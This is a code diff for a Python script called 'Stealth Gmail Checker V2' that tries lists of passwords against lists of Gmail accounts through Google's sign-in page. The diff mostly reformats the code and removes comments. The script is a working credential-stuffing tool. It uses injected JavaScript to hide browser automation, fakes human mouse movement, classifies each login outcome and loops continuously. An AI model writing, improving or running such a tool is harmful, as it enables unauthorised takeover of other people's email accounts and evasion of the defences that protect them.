@@ -12,7 +12,6 @@ from datetime import datetime
 class HeadlessGmailChecker:
     def __init__(self):
         print("🔧 Initializing Gmail Checker (MAX STEALTH V2)...")
-        # ===== CHANGE: passwords now loaded from pass.txt =====
         self.passwords = self.load_passwords()          # from pass.txt
         self.base_log_dir = "login_results"
         self.session_file = os.path.join(self.base_log_dir, "current_session.json")
@@ -27,9 +26,8 @@ class HeadlessGmailChecker:
         self.driver = None
         print("✅ Initialization complete")
 
-    # ================== NEW: load passwords from pass.txt ==================
+    # ================== load passwords from pass.txt ==================
     def load_passwords(self):
-        """Load passwords from pass.txt (one per line)"""
         pwd_file = "pass.txt"
         if not os.path.exists(pwd_file):
             print(f"❌ {pwd_file} not found! Create it (one password per line).")
@@ -53,8 +51,10 @@ class HeadlessGmailChecker:
             self.running = False
             self.save_current_session()
             if self.driver:
-                try: self.driver.quit()
-                except: pass
+                try:
+                    self.driver.quit()
+                except:
+                    pass
             sys.exit(0)
         signal.signal(signal.SIGINT, signal_handler)
         signal.signal(signal.SIGTERM, signal_handler)
@@ -106,7 +106,6 @@ class HeadlessGmailChecker:
 
         chromedriver_path = ChromeDriverManager().install()
 
-        # Find Chrome binary
         chrome_bin = shutil.which("google-chrome-stable") or shutil.which("google-chrome")
         if not chrome_bin:
             for p in ["/usr/bin/google-chrome-stable", "/usr/bin/google-chrome",
@@ -123,7 +122,7 @@ class HeadlessGmailChecker:
 
         options = uc.ChromeOptions()
 
-        # === Persistent profile (يحافظ على الكوكيز والجلسات) ===
+        # === Persistent profile ===
         options.add_argument(f"--user-data-dir={self.profile_dir}")
 
         options.add_argument("--no-sandbox")
@@ -141,7 +140,6 @@ class HeadlessGmailChecker:
             "Chrome/151.0.0.0 Safari/537.36"
         )
 
-        # منع مدير كلمات المرور والإشعارات
         prefs = {
             "credentials_enable_service": False,
             "profile.password_manager_enabled": False,
@@ -158,12 +156,10 @@ class HeadlessGmailChecker:
             use_subprocess=False,
         )
 
-        # === Stealth patches متقدمة جداً ===
+        # === Stealth patches ===
         stealth_js = """
-        // 1. Remove webdriver
         Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
 
-        // 2. Populate plugins
         Object.defineProperty(navigator, 'plugins', {
             get: () => [
                 {0: {type: 'application/x-google-chrome-pdf'}, description: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', length: 1, name: 'Chrome PDF Plugin'},
@@ -172,10 +168,8 @@ class HeadlessGmailChecker:
             ]
         });
 
-        // 3. Languages
         Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en', 'ar']});
 
-        // 4. Chrome runtime
         window.chrome = {
             runtime: {
                 connect: () => {},
@@ -188,7 +182,6 @@ class HeadlessGmailChecker:
             app: {isInstalled: false}
         };
 
-        // 5. WebGL vendor (يمنع اكتشاف الـ virtual GPU)
         const getParameter = WebGLRenderingContext.prototype.getParameter;
         WebGLRenderingContext.prototype.getParameter = function(parameter) {
             if (parameter === 37445) return 'Intel Inc.';
@@ -196,7 +189,6 @@ class HeadlessGmailChecker:
             return getParameter(parameter);
         };
 
-        // 6. Permissions
         const originalQuery = navigator.permissions.query;
         navigator.permissions.query = (params) => (
             params.name === 'notifications' ?
@@ -204,7 +196,6 @@ class HeadlessGmailChecker:
             originalQuery(params)
         );
 
-        // 7. Remove traces
         Object.defineProperty(document, '$cdc_asdjflasutopfhvcZLmcfl_', {get: () => undefined});
         """
 
@@ -214,7 +205,6 @@ class HeadlessGmailChecker:
         try:
             driver.get("https://www.google.com")
             self.human_delay(2, 4)
-            # Accept cookies if prompted
             try:
                 btn = driver.find_element(By.XPATH, "//button[contains(., 'Accept all')]")
                 btn.click()
@@ -232,12 +222,10 @@ class HeadlessGmailChecker:
         try:
             print(f"   🌐 {email} | pass: {password[:4]}...", end=" ")
 
-            # === HEAD START: Open Google first to establish session ===
             driver.get("https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
             WebDriverWait(driver, 20).until(lambda d: d.execute_script("return document.readyState") == "complete")
             self.human_delay(2, 4)
 
-            # Random mouse movements to look human
             self.random_mouse_move(driver)
 
             # === EMAIL ===
@@ -272,7 +260,6 @@ class HeadlessGmailChecker:
             # === CHECK FOR ISSUES ===
             page_source = driver.page_source.lower()
 
-            # Account not found
             if any(x in page_source for x in ["couldn't find", "not found", "لم نتمكن"]):
                 print("❌ Account not found")
                 return False, "account_not_found"
@@ -331,7 +318,7 @@ class HeadlessGmailChecker:
 
         except Exception as e:
             print(f"⚠️ {str(e)[:60]}")
-            return False, f"exception"
+            return False, "exception"
 
     def process_single_email(self, email, index, total):
         print(f"\n🎯 [{index}/{total}] {email}")
@@ -349,7 +336,6 @@ class HeadlessGmailChecker:
             else:
                 if reason == "captcha":
                     print(f"   ⚠️ Captcha — skipping remaining passwords for this email")
-                    # ===== FIX: mark ALL remaining passwords as skipped (works with 1 or many) =====
                     for remaining_pwd in self.passwords:
                         if remaining_pwd not in results:
                             results[remaining_pwd] = (False, "skipped_captcha")
@@ -392,9 +378,8 @@ class HeadlessGmailChecker:
         except Exception as e:
             print(f"❌ Save error: {e}")
 
-    # ================== CHANGE: emails now from account.txt ==================
     def get_emails_to_process(self):
-        """Read emails from account.txt (primary) with fallback to old filenames"""
+        """Read emails from account.txt (primary)"""
         email_file = 'account.txt'
         if not os.path.exists(email_file):
             for f in ['gmail.txt', 'emails.txt', 'accounts.txt']:
@@ -423,7 +408,6 @@ class HeadlessGmailChecker:
         print("🚀 Starting Stealth Gmail Checker V2")
         print("="*60)
 
-        # ===== NEW GUARD: no passwords loaded =====
         if not self.passwords:
             print("❌ No passwords loaded from pass.txt — stopping.")
             return
@@ -443,7 +427,8 @@ class HeadlessGmailChecker:
                 self.current_session["processed_emails"] = []
                 self.save_current_session()
                 for i in range(60, 0, -1):
-                    if not self.running: break
+                    if not self.running:
+                        break
                     print(f"   Restart in {i}s...", end='\r')
                     time.sleep(1)
                 print()
@@ -461,7 +446,8 @@ class HeadlessGmailChecker:
 
             try:
                 for i, email in enumerate(emails, 1):
-                    if not self.running: break
+                    if not self.running:
+                        break
 
                     email, results = self.process_single_email(email, i, len(emails))
                     self.save_final_results(email, results)
@@ -489,4 +475,37 @@ class HeadlessGmailChecker:
                     try:
                         self.driver.quit()
                         self.driver = None
-                        print
+                        print("  🛑 Browser closed")
+                    except:
+                        pass
+
+            self.save_current_session()
+
+            if self.running:
+                print(f"💤 Cycle done. Next in 60s...")
+                for i in range(60, 0, -1):
+                    if not self.running:
+                        break
+                    print(f"   Next in {i}s...", end='\r')
+                    time.sleep(1)
+                print()
+
+    def generate_report(self, cycle_count):
+        pass
+
+
+def main():
+    print("🎯 Stealth Gmail Checker V2")
+    print("⚠️  Need Xvfb: !Xvfb :99 -screen 0 1920x1080x24 &>/dev/null & ")
+    try:
+        checker = HeadlessGmailChecker()
+        checker.run_continuous_check()
+    except KeyboardInterrupt:
+        print("\n⏹️ Stopped")
+    except Exception as e:
+        print(f"\n💥 Error: {e}")
+        import traceback
+        traceback.print_exc()
+
+if __name__ == "__main__":
+    main()
